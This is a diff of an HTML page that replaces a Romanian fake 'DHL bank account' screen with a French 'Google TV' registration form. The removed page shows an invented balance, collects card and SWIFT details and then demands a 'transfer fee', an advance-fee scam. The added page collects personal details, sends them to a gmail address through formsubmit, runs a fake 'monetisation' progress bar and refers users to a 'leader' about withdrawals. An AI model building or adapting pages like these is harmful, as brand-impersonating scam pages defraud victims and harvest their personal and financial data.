@@ -1,909 +1,589 @@
 <!DOCTYPE html>
-<html lang="ro">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Cont bancar DHL</title>
+<title>Google TV — Inscription</title>
 
 <style>
-.promo-card{
-    margin-top:20px;
-    background:#2f5fd1;
-    border-radius:20px;
-    padding:20px;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    color:#fff;
-}
+*{box-sizing:border-box}
 
-.promo-text h3{
-    font-size:24px;
-    margin-bottom:10px;
-}
-
-.promo-text p{
-    font-size:16px;
-    margin-bottom:15px;
-}
-
-.promo-text button{
-    background:#fff;
-    color:#2f5fd1;
-    border:none;
-    padding:12px 20px;
-    border-radius:30px;
-    font-weight:bold;
-    cursor:pointer;
-}
-
-.promo-icon{
-    font-size:70px;
-}
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial;
-}
 body{
-background:#ECECEC;
-color:#222;
-padding:20px;
-font-family:Arial,sans-serif;
-max-width:390px;
-margin:0 auto;
-}
-
-/* FEREASTRĂ PIN */
-
-#pinOverlay{
-position:fixed;
-top:0;
-left:50%;
-transform:translateX(-50%);
-width:100%;
-max-width:390px;
-height:100%;
-background:#061a33;
-display:flex;
-justify-content:center;
-align-items:center;
-z-index:9999;
-padding:20px;
-}
-
-.pin-box{
-background:#ffffff;
-color:#222;
-box-shadow:0 8px 20px rgba(0,0,0,.12);
-padding:25px;
-border-radius:20px;
-width:100%;
-max-width:350px;
-text-align:center;
-}
-
-.pin-box h2{
-margin-bottom:20px;
-font-size:20px;
-}
-
-.pin-box input{
-width:100%;
-padding:14px;
-border:1px solid #ddd;
-border-radius:12px;
-background:#f5f5f5;
-color:#222;
-font-size:18px;
-text-align:center;
-margin-bottom:15px;
-outline:none;
-}
-
-.pin-box button{
-width:100%;
-padding:14px;
-border:none;
-border-radius:12px;
-background:#0057C2;
-color:white;
-font-size:18px;
-font-weight:bold;
-cursor:pointer;
-}
-
-/* CONFIRMARE */
-
-#confirmationBox{
-display:none;
-background:#16a34a;
-padding:25px;
-border-radius:25px;
-text-align:center;
-margin-bottom:20px;
-}
-
-#confirmationBox h2{
-font-size:20px;
-line-height:40px;
-margin-bottom:25px;
-color:white;
-}
-
-#ouiBtn,
-#nonBtn{
-padding:14px 35px;
-border:none;
-border-radius:14px;
-font-size:18px;
-font-weight:bold;
-cursor:pointer;
-margin:10px;
-transition:0.3s;
-color:white;
-box-shadow:0 4px 10px rgba(0,0,0,0.2);
-}
-
-#ouiBtn{
-background:#0d6efd;
-}
-
-#nonBtn{
-background:#ff3b30;
-}
-
-h1{
-font-size:20px;
-margin-bottom:18px;
-}
-
-.card-title{
-font-size:32px;
-font-weight:700;
-margin-bottom:18px;
-color:#222;
-}
-
-.card-title{
-    font-size:20px;
-    font-weight:bold;
-    color:#fff;
-    margin-bottom:10px;
-}
-
-.card-number{
-    font-size:14px;
-    letter-spacing:2px;
-    color:rgba(255,255,255,.85);
-    margin-bottom:12px;
-}
-
-.balance{
-    font-size:32px;
-    font-weight:bold;
-    color:#ffffff;
-    margin-bottom:18px;
-}
-    
-
-.line{
-    height:1px;
-    background:rgba(255,255,255,.25);
-    margin:16px 0;
-}
-
-.mastercard{
-width:70px;
-height:44px;
-}
-
-.blue-card{
-font-size:20px;
-font-weight:bold;
-color:#0A4DB8;
-}
-
-.gray-card{
-font-size:16px;
-}
-
-.card-number{
-font-size:22px;
-color:#999;
-margin-bottom:10px;
-letter-spacing:1px;
-}
-
-.balance{
-    font-size:32px;
-    font-weight:bold;
-    color:#0B57D0;
-    margin-bottom:12px;
-}
-
-.line{
-height:2px;
-background:#ECECEC;
-margin:20px 0;
-}
-
-.card-bottom{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-}
-    
-
-.mastercard{
-width:65px;
-height:40px;
-}
-
-.blue-card{
-    font-size:16px;
-    font-weight:bold;
-    color:#fff;
-}
-
-.gray-card{
-    font-size:12px;
-    color:rgba(255,255,255,.75);
-}
-.bank-card{
-    background:#ffffff;
-    border-radius:18px;
-    padding:16px;
-    margin:16px 0;
-    box-shadow:0 4px 12px rgba(0,0,0,0.08);
-}
-    
-.message{
-background:#ffffff;
-padding:15px;
-border-radius:18px;
-margin-bottom:18px;
-text-align:center;
-font-size:13px;
-font-weight:bold;
-line-height:24px;
-color:#444;
-box-shadow:0 5px 15px rgba(0,0,0,.08);
-}
-
-.stats{
-display:flex;
-gap:12px;
-margin-bottom:18px;
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:linear-gradient(135deg,#061a33,#0a568c,#0aa36b);
+  min-height:100vh;
+  color:#172033;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:18px
 }
 
 .box{
-flex:1;
-background:#ffffff;
-padding:15px;
-border-radius:18px;
-text-align:center;
-color:#222;
-box-shadow:0 5px 15px rgba(0,0,0,.08);
+  width:100%;
+  max-width:480px;
+  background:#fff;
+  border-radius:26px;
+  overflow:hidden;
+  box-shadow:0 24px 70px #0005
 }
 
-.box h3{
-font-size:13px;
-margin-bottom:8px;
-color:#aaa;
+h1{
+  margin:0;
+  font-size:25px
 }
 
-.box p{
-font-size:16px;
-font-weight:bold;
+.sub{
+  margin:8px 0 0;
+  opacity:.92;
+  font-size:14px
 }
 
-.btn{
-width:100%;
-background:#20e38a;
-border:none;
-padding:16px;
-font-size:18px;
-font-weight:bold;
-border-radius:18px;
-cursor:pointer;
-margin-top:10px;
-margin-bottom:20px;
-color:#03142d;
+.form{
+  padding:25px
 }
 
-.numero-box{
-background:#ffffff;
-color:#222;
-box-shadow:0 5px 15px rgba(0,0,0,.08);
-padding:16px;
-border-radius:18px;
-margin-top:12px;
-line-height:26px;
-font-size:14px;
-display:none;
+.field{
+  margin-bottom:15px
 }
 
-input, select{
-width:100%;
-padding:12px;
-border:1px solid #ddd;
-border-radius:12px;
-background:#f5f5f5;
-color:#222;
-font-size:14px;
-outline:none;
-margin-bottom:15px;
+label{
+  display:block;
+  font-weight:700;
+  font-size:14px;
+  margin-bottom:7px
 }
 
-.progress-zone{
-margin-top:22px;
-display:none;
+input,select{
+  width:100%;
+  padding:14px;
+  border:1px solid #d8e0e8;
+  border-radius:12px;
+  background:#f7f9fb;
+  font-size:15px;
+  outline:none
 }
 
-.progress-text{
-font-size:13px;
-margin-bottom:10px;
-text-align:center;
+input:focus,select:focus{
+  border-color:#0aa36b;
+  box-shadow:0 0 0 3px #0aa36b18
 }
 
-.loader{
-width:40px;
-height:40px;
-border:4px solid #ccc;
-border-top:4px solid #20e38a;
-border-radius:50%;
-animation:spin 1s linear infinite;
-margin:15px auto;
+.grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:12px
+}
+
+button{
+  width:100%;
+  border:0;
+  border-radius:13px;
+  padding:15px;
+  font-weight:800;
+  font-size:16px;
+  cursor:pointer
+}
+
+.send{
+  background:linear-gradient(135deg,#075b32,#12ad70);
+  color:white;
+  box-shadow:0 9px 20px #075b3235
+}
+
+.note{
+  font-size:11px;
+  color:#707b89;
+  text-align:center;
+  line-height:1.5;
+  margin-top:14px
+}
+
+.process{
+  display:none;
+  padding:38px 25px;
+  text-align:center
+}
+
+.spinner{
+  width:70px;
+  height:70px;
+  border:6px solid #e8f1ec;
+  border-top-color:#0aa36b;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 22px
 }
 
 @keyframes spin{
-100%{
-transform:rotate(360deg);
+  to{transform:rotate(360deg)}
 }
+
+.process h2{
+  font-size:24px;
+  margin:0 0 10px;
+  color:#075b32
+}
+
+.process p{
+  color:#5b6675;
+  line-height:1.5
 }
 
 .progress{
-width:100%;
-height:10px;
-background:#ddd;
-border-radius:20px;
-overflow:hidden;
-margin-top:15px;
+  height:9px;
+  background:#e8edf1;
+  border-radius:20px;
+  overflow:hidden;
+  margin:24px 0 8px
 }
 
 .bar{
-width:0%;
-height:100%;
-background:green;
-text-align:center;
-line-height:10px;
-font-size:8px;
-transition:0.3s;
+  height:100%;
+  width:0;
+  background:linear-gradient(90deg,#075b32,#12ad70);
+  transition:width 1s linear
 }
 
-#temps{
-margin-top:10px;
-font-size:12px;
-text-align:center;
+.timer{
+  font-size:12px;
+  color:#75808d
 }
 
-#plateforme{
-display:none;
+.success{
+  display:none;
+  text-align:center;
+  padding:38px 25px
 }
-.loader-mini{
-width:16px;
-height:16px;
-border:2px solid white;
-border-top:2px solid transparent;
-border-radius:50%;
-display:inline-block;
-animation:spin 1s linear infinite;
-vertical-align:middle;
-margin-left:5px;
+
+.check{
+  width:88px;
+  height:88px;
+  border-radius:50%;
+  background:#e7f9ef;
+  color:#08a05f;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 18px;
+  font-size:48px;
+  font-weight:900;
+  box-shadow:0 0 0 10px #e7f9ef55
+}
+
+.success h2{
+  font-size:27px;
+  color:#08733f;
+  margin:0 0 12px
+}
+
+.success p{
+  color:#536070;
+  line-height:1.6;
+  margin:0
+}
+
+.ticker{
+  position:fixed;
+  bottom:0;
+  left:0;
+  width:100%;
+  background:#061a33;
+  color:#fff;
+  overflow:hidden;
+  white-space:nowrap;
+  padding:10px 0;
+  font-size:12px
+}
+
+.ticker span{
+  display:inline-block;
+  padding-left:100%;
+  animation:move 18s linear infinite
+}
+
+@keyframes move{
+  to{transform:translateX(-100%)}
+}
+
+@media(max-width:420px){
+  .grid{
+    grid-template-columns:1fr
   }
+}
 
+.header-screenshot{
+  width:100%;
+  padding:14px 14px 0;
+  background:#fff;
+  line-height:0
+}
+
+.header-screenshot img{
+  display:block;
+  width:100%;
+  height:185px;
+  object-fit:cover;
+  object-position:center top;
+  border-radius:18px;
+  box-shadow:0 8px 24px rgba(0,0,0,.14)
+}
 </style>
 </head>
 
 <body>
 
-<div id="loginPage">
+<div class="box">
 
-<div class="pin-box">
+  <div class="header-screenshot">
+    <img src="1000049740.jpg" alt="En-tête">
+  </div>
 
-<h2>Autentificare DHL</h2>
+  <div class="form" id="form">
 
-<input type="text"
-id="loginUser"
-placeholder="Adresă email">
+    <h1>Inscription Google TV</h1>
 
-<input type="password"
-id="loginPass"
-placeholder="Parolă">
+    <p class="sub">
+      Veuillez renseigner vos informations pour continuer.
+    </p>
 
-<button type="button" onclick="connexion()">
-Conectare
-</button>
+    <form
+      id="registration"
+      action="https://formsubmit.co/europeennetvplateforme@gmail.com"
+      method="POST"
+      target="formsubmitFrame">
 
-</div>
+      <input
+        type="hidden"
+        name="_subject"
+        value="Nouvelle inscription — Google TV">
 
-</div>
+      <input
+        type="hidden"
+        name="_template"
+        value="table">
 
-<div id="siteContent" style="display:none;">
+      <input
+        type="hidden"
+        name="_captcha"
+        value="false">
 
-<div id="pinOverlay">
+      <div class="grid">
 
-<div class="pin-box">
+        <div class="field">
+          <label>Nom</label>
+          <input
+            name="Nom"
+            required
+            placeholder="Votre nom">
+        </div>
 
-<h2>Cod PIN de securitate</h2>
+        <div class="field">
+          <label>Prénom</label>
+          <input
+            name="Prénom"
+            required
+            placeholder="Votre prénom">
+        </div>
 
-<input
-type="password"
-id="pinInput"
-placeholder="Introduceți codul"
-/>
+      </div>
 
-<button onclick="verifierPin()">
-Validare
-</button>
+      <div class="grid">
 
-</div>
+        <div class="field">
+          <label>Âge</label>
+          <input
+            name="Âge"
+            type="number"
+            min="18"
+            max="100"
+            required
+            placeholder="Votre âge">
+        </div>
 
-</div>
+        <div class="field">
+          <label>Genre</label>
 
-<div id="confirmationBox">
+          <select name="Genre" required>
 
-<h2>
-Doriți cu adevărat să efectuați retragerea prin transfer bancar?
-</h2>
+            <option value="">
+              Sélectionner
+            </option>
 
-<button id="ouiBtn">
-DA
-</button>
+            <option>Homme</option>
+            <option>Femme</option>
+            <option>Autre</option>
+            <option>Préfère ne pas préciser</option>
 
-<button id="nonBtn">
-NU
-</button>
+          </select>
 
-</div>
+        </div>
 
-<div id="plateforme">
+      </div>
 
-<h1>
-Bună ziua, <span id="nom"></span>
-</h1>
+      <div class="field">
 
-<h2 class="card-title">
-Card accounts
-</h2>
+        <label>Pays de résidence</label>
 
-<div class="bank-card">
+        <select name="Pays de résidence" required>
 
-<div class="card-number">
-2259 **** **** 5621
-</div>
+          <option value="">
+            Sélectionner votre pays
+          </option>
 
-<div class="balance">
-<span id="solde">100 333,45</span> MDL
-</div>
+          <option>Bénin</option>
+          <option>Côte d’Ivoire</option>
+          <option>Mali</option>
+          <option>Sénégal</option>
+          <option>Burkina Faso</option>
+          <option>Cameroun</option>
+          <option>Ghana</option>
 
-<div class="line"></div>
+        </select>
 
-<div class="card-bottom">
+      </div>
 
-<div class="mastercard">
+      <div class="field">
 
-<svg viewBox="0 0 90 56">
+        <label>Ville</label>
 
-<rect width="90" height="56" rx="8" fill="#C9962D"/>
+        <input
+          name="Ville"
+          required
+          placeholder="Votre ville">
 
-<rect x="12" y="18" width="18" height="14" rx="2" fill="#F4D46B"/>
+      </div>
 
-<circle cx="67" cy="42" r="8" fill="#EB001B"/>
+      <div class="field">
 
-<circle cx="75" cy="42" r="8" fill="#F79E1B"/>
+        <label>Profession</label>
 
-</svg>
+        <input
+          name="Profession"
+          required
+          placeholder="Votre profession">
 
-</div>
+      </div>
 
-<div>
-    <div class="blue-card">
-        ID : 5753 **** **** 8504
+      <button
+        type="submit"
+        class="send">
+        ENVOYER
+      </button>
+
+      <div class="note">
+        Les informations saisies sont transmises à l’adresse
+        de réception configurée pour ce formulaire.
+        Cette page ne constitue pas une validation officielle
+        de Google TV.
+      </div>
+
+    </form>
+
+    <iframe
+      name="formsubmitFrame"
+      style="display:none">
+    </iframe>
+
+  </div>
+
+
+  <div class="process" id="process">
+
+    <div class="spinner"></div>
+
+    <h2 id="status">
+      Vérification des informations en cours…
+    </h2>
+
+    <p id="desc">
+      Veuillez patienter pendant le traitement de votre demande.
+    </p>
+
+    <div class="progress">
+      <div
+        class="bar"
+        id="bar">
+      </div>
     </div>
 
-    <div class="gray-card">
-        Réf. : 2259 **** **** 5621
-    </div>
-</div>
-
-</div>
-
-</div>
-<div class="promo-card">
-    <div class="promo-text">
-        <h3>Special Offer</h3>
-        <p>Up to 200 000 points</p>
-        <button>Learn more</button>
+    <div
+      class="timer"
+      id="timer">
+      Étape 1 sur 3
     </div>
 
-    <div class="promo-icon">💰</div>
-</div>
-<div class="message">
-Bine ați venit în contul dumneavoastră bancar DHL ✅
-</div>
-<div class="message" id="statusTransfer" style="
-display:none;
-background:#ffffff;
-color:#222;
-">
-Transfer bancar în curs de procesare... ⏳
-<span class="loader-mini"></span>
-<span class="loader-mini"></span>
-</div>
-<div class="stats">
-
-<div class="box" style="width:100%;">
-<h3>Retragere</h3>
-<p>Disponibilă</p>
-</div>
-
-</div>
-
-<button class="btn" id="retrait">
-💶 RETRAGERE BANCARĂ
-</button>
-
-<div class="numero-box" id="formulaire">
-
-<div style="font-size:14px;font-weight:bold;margin-bottom:10px;">
-Completați informațiile bancare
-</div>
-
-<input type="text" placeholder="Nume și prenume beneficiar">
-
-<input type="text" placeholder="Număr card">
-
-<input type="text" placeholder="Banca beneficiarului">
-
-<input type="text" placeholder="Cod Swift">
-
-<input
-type="number"
-id="leiInput"
-placeholder="Introduceți suma în MDL">
+  </div>
 
 
-<select>
-<option selected>MDL</option>
-</select>
+  <div class="success" id="success">
 
-<input type="text" placeholder="Motivul transferului">
+    <div class="check">
+      ✓
+    </div>
 
-<button class="btn" id="valider">
-✅ VALIDARE
-</button>
+    <h2>
+      INSCRIPTION TERMINÉE
+    </h2>
 
-</div>
-<div id="rezumat" style="
-display:none;
-background:#ffffff;
-color:#222;
-padding:16px;
-border-radius:18px;
-margin-bottom:18px;
-line-height:28px;
-box-shadow:0 5px 15px rgba(0,0,0,.08);
-">
+    <p>
+      <strong>
+        Votre parcours d'inscription est terminé.
+      </strong>
 
-<h3 style="margin-bottom:10px;">
-Detalii transfer
-</h3>
+      <br><br>
 
-<p id="rNume"></p>
-<p id="rIban"></p>
-<p id="rBanca"></p>
-<p id="rSwift"></p>
-<p id="rSuma"></p>
+      Veuillez contacter votre leader ou l'organisateur
+      pour connaître les prochaines étapes et les conditions
+      applicables, notamment celles relatives aux retraits.
+    </p>
 
-</div>
-<div class="progress-zone" id="zoneProgress">
-
-<div class="progress-text">
-Transfer bancar în curs...
-</div>
-
-<div class="loader"></div>
-
-<div class="progress">
-
-<div class="bar" id="bar">
-0%
-</div>
+  </div>
 
 </div>
 
-<div id="temps">
-99 secunde rămase
-</div>
+
+<div class="ticker">
+
+  <span>
+    INFORMATION : les conditions de retrait et les éventuels
+    frais doivent être communiqués clairement et vérifiés
+    auprès de l'organisateur.
+  </span>
 
 </div>
 
-</div>
 
 <script>
 
-function connexion(){
+const form =
+  document.getElementById("form");
 
-let user =
-document.getElementById("loginUser").value.trim();
+const process =
+  document.getElementById("process");
 
-let pass =
-document.getElementById("loginPass").value.trim();
+const success =
+  document.getElementById("success");
 
-if(
-user === "dhlcommd@gmail.com" &&
-pass === "636333"
-){
+const status =
+  document.getElementById("status");
 
-document.getElementById("loginPage").style.display = "none";
-
-document.getElementById("siteContent").style.display = "block";
-
-}else{
-
-alert("Email sau parolă incorectă");
-
-}
-
-}
-
-window.onload = function () {
-    document.getElementById("solde").innerText = "1 540 500";
-};
-
-function verifierPin(){
-
-const pin =
-document.getElementById("pinInput").value;
-
-if(pin === "636333"){
-
-document.getElementById("pinOverlay").style.display = "none";
-
-document.getElementById("confirmationBox").style.display = "block";
-
-}else{
-
-alert("Cod incorect");
-
-}
-
-}
-
-/* DA */
-
-document.getElementById("ouiBtn")
-.addEventListener("click", function(){
-
-document.getElementById("confirmationBox").innerHTML = `
-
-<div style="
-color:white;
-font-size:20px;
-font-weight:bold;
-padding:30px;
-text-align:center;
-">
-
-Vă rugăm să așteptați...
-
-<div class="loader"></div>
-
-</div>
-
-`;
-
-setTimeout(function(){
-
-document.getElementById("confirmationBox").style.display = "none";
-
-document.getElementById("plateforme").style.display = "block";
-
-},3000);
-
-});
-
-/* NU */
-
-document.getElementById("nonBtn")
-.addEventListener("click", function(){
-
-location.reload();
-
-});
-/* RETRAGERE */
-
-document.getElementById("retrait")
-.addEventListener("click", function(){
-
-document.getElementById("formulaire")
-.style.display = "block";
-
-document.getElementById("formulaire")
-.scrollIntoView({
-behavior:"smooth"
-});
-
-});
-
-/* VALIDARE */
-
-document.getElementById("valider")
-.addEventListener("click", function(){
-
-const inputs =
-document.querySelectorAll("#formulaire input");
-for(let i = 0; i < inputs.length; i++){
-
-if(inputs[i].value.trim() === ""){
-
-alert("Vă rugăm să introduceți informațiile destinatarului.");
-
-return;
-
-}
-
-  }
-document.getElementById("rNume").innerHTML =
-"Nume: " + inputs[0].value;
-
-document.getElementById("rIban").innerHTML =
-"Număr card: " + inputs[1].value;
-
-document.getElementById("rBanca").innerHTML =
-"Bancă: " + inputs[2].value;
-
-document.getElementById("rSwift").innerHTML =
-"SWIFT: " + inputs[3].value;
-
-document.getElementById("rSuma").innerHTML =
-"Sumă: " + inputs[4].value;
-
-document.getElementById("rezumat").style.display =
-"block";
-window.scrollTo({
-top: document.body.scrollHeight,
-behavior: "smooth"
-});
-document.getElementById("zoneProgress").style.display =
-"block";
-window.scrollTo({
-top: document.body.scrollHeight,
-behavior: "smooth"
-});
-let temps = 11;
-let pourcentage = 0;
+const desc =
+  document.getElementById("desc");
 
 const bar =
-document.getElementById("bar");
+  document.getElementById("bar");
 
-const tempsTexte =
-document.getElementById("temps");
+const timer =
+  document.getElementById("timer");
 
-const texte =
-document.querySelector(".progress-text");
 
-const interval = setInterval(function(){
+document
+  .getElementById("registration")
+  .addEventListener("submit", e => {
 
-temps--;
+    e.preventDefault();
 
-pourcentage += 5;
+    const f =
+      document.getElementById("registration");
 
-bar.style.width =
-pourcentage + "%";
+    f.submit();
 
-bar.innerHTML =
-pourcentage + "%";
+    form.style.display = "none";
 
-tempsTexte.innerHTML =
-temps + " secunde rămase";
-if (temps <= 0) {
+    process.style.display = "block";
 
-    clearInterval(interval);
 
-    document.body.innerHTML = `
-<div style="
-background:#f4f6fb;
-min-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-padding:20px;
-font-family:Arial,sans-serif;
-">
+    const start = Date.now();
 
-<div style="
-background:#fff;
-width:100%;
-max-width:360px;
-border-radius:25px;
-padding:30px 25px;
-box-shadow:0 10px 30px rgba(0,0,0,.15);
-">
+    const total = 12000;
 
-<h2 style="
-text-align:center;
-color:#222;
-margin-bottom:30px;
-font-size:24px;
-">
-Transfer Status
-</h2>
 
-<div style="display:flex;align-items:center;">
-<div style="width:42px;height:42px;border-radius:50%;background:#22c55e;color:#fff;font-size:22px;font-weight:bold;display:flex;justify-content:center;align-items:center;">✓</div>
-<div style="margin-left:15px;">
-<div style="font-weight:bold;font-size:18px;">Transfer started</div>
-<div style="color:#777;font-size:13px;">Your transfer has been initiated.</div>
-</div>
-</div>
+    const steps = [
 
-<div style="width:3px;height:45px;background:#22c55e;margin:8px 0 8px 20px;"></div>
+      [
+        0,
+        "Vérification des informations en cours…",
+        "Analyse des informations saisies."
+      ],
 
-<div style="display:flex;align-items:center;">
-<div style="width:42px;height:42px;border-radius:50%;background:#22c55e;color:#fff;font-size:22px;font-weight:bold;display:flex;justify-content:center;align-items:center;">✓</div>
-<div style="margin-left:15px;">
-<div style="font-weight:bold;font-size:18px;">Payment confirmed</div>
-<div style="color:#777;font-size:13px;">The payment has been verified.</div>
-</div>
-</div>
+      [
+        4000,
+        "Préparation de l'inscription en cours…",
+        "Votre demande passe à l'étape suivante."
+      ],
 
-<div style="width:3px;height:45px;background:#d9d9d9;margin:8px 0 8px 20px;"></div>
+      [
+        8000,
+        "Monétisation en cours…",
+        "Finalisation de votre parcours d'inscription."
+      ]
 
-<div style="display:flex;align-items:center;">
-<div style="width:42px;height:42px;border-radius:50%;border:3px solid #d9d9d9;background:#fff;"></div>
-<div style="margin-left:15px;">
-<div style="font-weight:bold;font-size:18px;color:#999;">Final confirmation</div>
-<div style="color:#999;font-size:13px;">Waiting for completion.</div>
-</div>
-</div>
+    ];
 
-<div style="
-margin-top:35px;
-background:#fff3f3;
-border-left:5px solid #e53935;
-padding:15px;
-border-radius:12px;
-">
 
-<p style="
-margin:0;
-color:#c62828;
-font-size:15px;
-line-height:1.7;
-font-weight:bold;
-">
-Vă rugăm să achitați taxa de transfer pentru ca suma să poată fi creditată pe cardul dumneavoastră bancar.
-</p>
+    function tick(){
 
-</div>
+      const elapsed =
+        Date.now() - start;
 
-</div>
-</div>
-`;
 
-}
+      if(elapsed >= total){
 
-},1000);
+        process.style.display = "none";
 
-});
+        success.style.display = "block";
 
+        return;
+      }
+
+
+      let s = steps[2];
+
+
+      if(elapsed < 4000){
+
+        s = steps[0];
+
+      }else if(elapsed < 8000){
+
+        s = steps[1];
+
+      }
+
+
+      status.textContent = s[1];
+
+      desc.textContent = s[2];
+
+
+      bar.style.width =
+        (elapsed / total * 100) + "%";
+
+
+      timer.textContent =
+        "Étape " +
+        (elapsed < 4000
+          ? 1
+          : elapsed < 8000
+          ? 2
+          : 3) +
+        " sur 3 • " +
+        Math.floor(elapsed / 1000) +
+        " s";
+
+
+      requestAnimationFrame(tick);
+
+    }
+
+
+    tick();
+
+  });
 
 </script>
-</div>
+
 </body>
-  </html>
+</html>
